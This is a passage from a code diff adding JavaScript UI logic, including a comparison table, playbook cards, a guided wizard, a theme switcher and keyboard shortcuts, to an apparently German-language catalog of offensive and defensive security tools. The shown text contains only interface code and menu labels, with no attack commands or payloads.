+    {label:'Kommando', get: t => `<span class="compare-cmd">${t.cmd}</span>`},
+    {label:'Beschreibung', get: t => t.desc},
+    {label:'Tags', get: t => t.tags.join(', ')},
+    {label:'Kategorie', get: t => popLabel[t.pop] || t.pop},
+    {label:'Audio', get: t => t.audioTime},
+  ];
+  let html = '<table class="compare-table"><thead><tr><th>Eigenschaft</th>';
+  tools.forEach(t => html += `<th>${t.name}</th>`);
+  html += '</tr></thead><tbody>';
+  rows.forEach(row => {
+    html += `<tr><td>${row.label}</td>`;
+    tools.forEach(t => html += `<td>${row.get(t)}</td>`);
+    html += '</tr>';
+  });
+  html += '</tbody></table>';
+  document.getElementById('compare-table-wrapper').innerHTML = html;
+  document.getElementById('compare-overlay').classList.add('visible');
+}
+
+document.getElementById('compare-close').addEventListener('click', () => {
+  document.getElementById('compare-overlay').classList.remove('visible');
+});
+document.getElementById('compare-overlay').addEventListener('click', (e) => {
+  if (e.target.id === 'compare-overlay') {
+    document.getElementById('compare-overlay').classList.remove('visible');
+  }
+});
+document.getElementById('compare-clear').addEventListener('click', () => {
+  compareSet.clear();
+  renderTools(getFilteredTools());
+  updateCompareBar();
+});
+document.getElementById('compare-go').addEventListener('click', showCompareModal);
+document.addEventListener('click', (e) => {
+  if (e.target.classList.contains('compare-btn')) {
+    e.stopPropagation();
+    toggleCompare(e.target.dataset.compare);
+  }
+  if (e.target.dataset.compareRemove) {
+    e.stopPropagation();
+    toggleCompare(e.target.dataset.compareRemove);
+  }
+});
+
+// Delegated click for tool-cards — open detail modal
+// Skip if the user clicked an inner button (fav, compare, copy, audio)
+document.addEventListener('click', (e) => {
+  if (e.target.closest('.fav-btn, .compare-btn, .tool-cmd-copy, .tool-audio-btn')) return;
+  const card = e.target.closest('.tool-card');
+  if (card && card.dataset.id) {
+    showToolDetail(card.dataset.id);
+  }
+});
+
+// Close detail modal on overlay background click
+document.getElementById('detail-overlay').addEventListener('click', (e) => {
+  if (e.target.id === 'detail-overlay') closeToolDetail();
+});
+
+// [MOVED TO TOP] playbooks data
+
+function getPlaybooks() { return playbooks[currentMode] || []; }
+
+function renderPlaybooks() {
+  const grid = document.getElementById('playbooks-grid');
+  if (!grid) return;
+  const pbs = getPlaybooks();
+  grid.innerHTML = pbs.map(pb => `
+    <div class="playbook-card ${activePlaybook === pb.id ? 'active' : ''}" data-playbook="${pb.id}">
+      <div class="playbook-icon">${pb.icon}</div>
+      <div class="playbook-name">${pb.name}</div>
+      <div class="playbook-meta">
+        <span>${pb.tools.length} Tools</span>
+        <span class="playbook-difficulty ${pb.difficulty}">${pb.difficulty === 'easy' ? 'Anfänger' : pb.difficulty === 'medium' ? 'Mittel' : 'Profi'}</span>
+      </div>
+    </div>
+  `).join('');
+}
+
+function highlightPlaybook(pbId) {
+  document.querySelectorAll('.playbook-card').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.tool-card').forEach(c => c.classList.remove('pb-match'));
+  if (pbId === activePlaybook) {
+    activePlaybook = null;
+    return;
+  }
+  activePlaybook = pbId;
+  const pb = getPlaybooks().find(p => p.id === pbId);
+  if (!pb) return;
+  document.querySelector(`.playbook-card[data-playbook="${pbId}"]`)?.classList.add('active');
+  pb.tools.forEach(tid => {
+    document.querySelector(`.tool-card[data-id="${tid}"]`)?.classList.add('pb-match');
+  });
+  // Scroll to first matched tool
+  const first = document.querySelector('.tool-card.pb-match');
+  if (first) first.scrollIntoView({behavior:'smooth',block:'center'});
+}
+
+// ═══ DUAL-MODE WIZARD ═══
+const wizardFlows = {
+  blue: [
+    {
+      q: 'Was willst du angreifen?',
+      options: [
+        {icon:'🌐', label:'Eine Web-Anwendung / Website', next:1},
+        {icon:'📡', label:'Ein Netzwerk / Hosts', next:2},
+        {icon:'🔑', label:'Passwörter / Hashes', result:'password-crack'},
+        {icon:'📶', label:'Ein WiFi-Netzwerk', result:'wifi-audit'},
+        {icon:'🏰', label:'Active Directory / Windows-Domain', result:'ad-attack'},
+      ]
+    },
+    {
+      q: 'Wie tief willst du bei der Web-App gehen?',
+      options: [
+        {icon:'⚡', label:'Schneller Scan (Low-Hanging Fruit)', result:'recon-sprint'},
+        {icon:'🔬', label:'Vollständiger Pentest', result:'web-pentest'},
+      ]
+    },
+    {
+      q: 'Was ist dein Ziel im Netzwerk?',
+      options: [
+        {icon:'🔍', label:'Aufklärung & Service-Scan', result:'recon-sprint'},
+        {icon:'💥', label:'Known Exploits nutzen', result:'post-exploit'},
+        {icon:'🏰', label:'Lateral Movement zu anderen Hosts', result:'ad-attack'},
+      ]
+    },
+  ],
+  purple: [
+    {
+      q: 'Was ist deine Mission?',
+      options: [
+        {icon:'🛡️', label:'System härten / absichern', result:'system-hardening'},
+        {icon:'👁️', label:'Monitoring aufbauen (SOC)', next:1},
+        {icon:'🚨', label:'Auf einen Vorfall reagieren', result:'incident-response'},
+        {icon:'🔍', label:'Aktive Bedrohungssuche', result:'threat-hunt'},
+      ]
+    },
+    {
+      q: 'Wie sieht deine Monitoring-Umgebung aus?',
+      options: [
+        {icon:'🚀', label:'Von Null anfangen (Quick Setup)', result:'active-overwatch'},
+        {icon:'📊', label:'Schwachstellen bewerten', result:'vuln-assessment'},
+        {icon:'💾', label:'Backup & Recovery planen', result:'backup-recovery'},
+      ]
+    },
+  ]
+};
+
+let wizStep = 0;
+let wizHistory = [];
+
+function renderWizardStep() {
+  const content = document.getElementById('wizard-content');
+  const flow = wizardFlows[currentMode] || wizardFlows.blue;
+
+  if (wizStep >= flow.length) {
+    content.innerHTML = '<div class="wizard-result"><h3>Kein passendes Playbook</h3><p class="wizard-result-desc">Probier die Quick-Start Playbooks oben!</p></div>';
+    return;
+  }
+
+  const step = flow[wizStep];
+  const stepCount = `<div class="wizard-step-indicator">Schritt ${wizStep + 1} / ${flow.length} · ${currentMode === 'blue' ? '🔵 Blue Team' : '🟣 Purple Team'}</div>`;
+
+  let backBtn = '';
+  if (wizHistory.length > 0) {
+    backBtn = '<button class="wizard-back" id="wiz-back">← Zurück</button>';
+  }
+
+  content.innerHTML = `
+    ${stepCount}
+    <div class="wizard-question">${step.q}</div>
+    <div class="wizard-options" id="wiz-options"></div>
+    ${backBtn}
+  `;
+
+  const optsEl = document.getElementById('wiz-options');
+  step.options.forEach(opt => {
+    const btn = document.createElement('button');
+    btn.className = 'wizard-option';
+    btn.innerHTML = `<span class="wizard-option-icon">${opt.icon}</span> ${opt.label}`;
+    btn.addEventListener('click', () => {
+      if (opt.result !== undefined) {
+        showWizardPlaybook(opt.result);
+      } else {
+        wizHistory.push(wizStep);
+        wizStep = opt.next;
+        renderWizardStep();
+      }
+    });
+    optsEl.appendChild(btn);
+  });
+
+  if (wizHistory.length > 0) {
+    document.getElementById('wiz-back').addEventListener('click', () => {
+      wizStep = wizHistory.pop();
+      renderWizardStep();
+    });
+  }
+}
+
+function showWizardPlaybook(pbId) {
+  const pb = getPlaybooks().find(p => p.id === pbId);
+  const content = document.getElementById('wizard-content');
+  if (!pb) {
+    renderWizardStep();
+    return;
+  }
+  content.innerHTML = `
+    <div class="wizard-result">
+      <h3>${pb.icon} ${pb.name}</h3>
+      <p class="wizard-result-desc">${pb.desc}</p>
+      <div class="wizard-result-tools">${pb.tools.map(t => `<span class="wizard-result-tool">${t}</span>`).join('')}</div>
+      <div class="wizard-actions">
+        <button class="wizard-btn-primary" id="wiz-start-pb">▶ Playbook starten</button>
+        <button class="wizard-btn-secondary" id="wiz-restart">↺ Neu starten</button>
+      </div>
+    </div>
+  `;
+  document.getElementById('wiz-start-pb').addEventListener('click', () => {
+    document.getElementById('wizard-overlay').classList.remove('visible');
+    highlightPlaybook(pbId);
+  });
+  document.getElementById('wiz-restart').addEventListener('click', () => {
+    wizStep = 0;
+    wizHistory = [];
+    renderWizardStep();
+  });
+}
+
+document.getElementById('wizard-open').addEventListener('click', () => {
+  wizStep = 0;
+  wizHistory = [];
+  renderWizardStep();
+  document.getElementById('wizard-overlay').classList.add('visible');
+});
+document.getElementById('wizard-close').addEventListener('click', () => {
+  document.getElementById('wizard-overlay').classList.remove('visible');
+});
+document.getElementById('wizard-overlay').addEventListener('click', (e) => {
+  if (e.target.id === 'wizard-overlay') {
+    document.getElementById('wizard-overlay').classList.remove('visible');
+  }
+});
+
+// LLM Prompt Builder open/close
+document.getElementById('prompt-open').addEventListener('click', () => {
+  document.getElementById('prompt-overlay').classList.add('visible');
+  renderPromptModal();
+});
+document.getElementById('prompt-overlay').addEventListener('click', (e) => {
+  if (e.target.id === 'prompt-overlay' || e.target.id === 'prompt-close') {
+    document.getElementById('prompt-overlay').classList.remove('visible');
+  }
+});
+
+// Playbook card click handler
+document.addEventListener('click', (e) => {
+  const card = e.target.closest('.playbook-card');
+  if (card) {
+    highlightPlaybook(card.dataset.playbook);
+  }
+});
+
+// Render playbooks on load (init call is inserted above by PATCH 7)
+
+// Reading progress bar
+window.addEventListener('scroll', () => {
+  const bar = document.getElementById('reading-progress');
+  if (!bar) return;
+  const scrolled = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+  bar.style.width = Math.min(100, Math.max(0, scrolled)) + '%';
+}, {passive:true});
+
+// Theme toggle
+const THEME_KEY = 'forensik-theme';
+function loadTheme() { return localStorage.getItem(THEME_KEY) || 'dark'; }
+function applyTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  document.querySelectorAll('.theme-btn').forEach(b => {
+    b.classList.toggle('active', b.dataset.theme === theme);
+  });
+  localStorage.setItem(THEME_KEY, theme);
+}
+document.querySelectorAll('.theme-btn').forEach(btn => {
+  btn.addEventListener('click', () => applyTheme(btn.dataset.theme));
+});
+applyTheme(loadTheme());
+
+// Keyboard shortcuts
+document.addEventListener('keydown', (e) => {
+  // Don't trigger when typing in input
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+    if (e.key === 'Escape') e.target.blur();
+    return;
+  }
+
+  // Ctrl+K or Cmd+K — focus search
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    document.getElementById('search').focus();
+    return;
+  }
+
+  // Esc — close all modals
+  if (e.key === 'Escape') {
+    document.querySelectorAll('.compare-modal-overlay.visible, .wizard-overlay.visible, .cheat-overlay.visible, .detail-overlay.visible, .prompt-overlay.visible').forEach(m => m.classList.remove('visible'));
+    return;
+  }
+
+  // ? — show cheat sheet
+  if (e.key === '?') {
+    document.getElementById('cheat-overlay').classList.toggle('visible');
+    return;
+  }
+
+  // 0-9 — category filter (0 = all, 1-9 = first 9 categories in current mode)
+  if (e.key >= '0' && e.key <= '9') {
+    if (e.key === '0') {
+      const allBtn = document.querySelector('.filter-btn[data-filter="all"]');
+      if (allBtn) allBtn.click();
+    } else {
+      const idx = parseInt(e.key) - 1;
+      const cat = getCategories()[idx];
+      if (cat) {
+        const btn = document.querySelector(`.filter-btn[data-filter="${cat.id}"]`);
+        if (btn) btn.click();
+      }
+    }
+    return;
+  }
+
+  // F — toggle favorites
+  if (e.key.toLowerCase() === 'f') {
+    const favBtn = document.querySelector('.filter-btn[data-filter="fav"]');
+    if (favBtn) favBtn.click();
+    return;
+  }
+
+  // C — open comparator
+  if (e.key.toLowerCase() === 'c') {
+    if (compareSet.size >= 2) showCompareModal();
+    return;
+  }
+});
+
+// Cheat sheet close handlers
+document.getElementById('cheat-close').addEventListener('click', () => {
+  document.getElementById('cheat-overlay').classList.remove('visible');
+});
+document.getElementById('cheat-overlay').addEventListener('click', (e) => {
+  if (e.target.id === 'cheat-overlay') {
+    document.getElementById('cheat-overlay').classList.remove('visible');
+  }
+});
+document.getElementById('kbd-hint').addEventListener('click', () => {
+  document.getElementById('cheat-overlay').classList.toggle('visible');
+});
+
+    // Init
+    document.addEventListener('DOMContentLoaded', () => {
+      // Apply persisted mode (button state + DOM attribute + first render)
+      switchMode(currentMode);
+    });
+  </script>
+</body>
+</html>
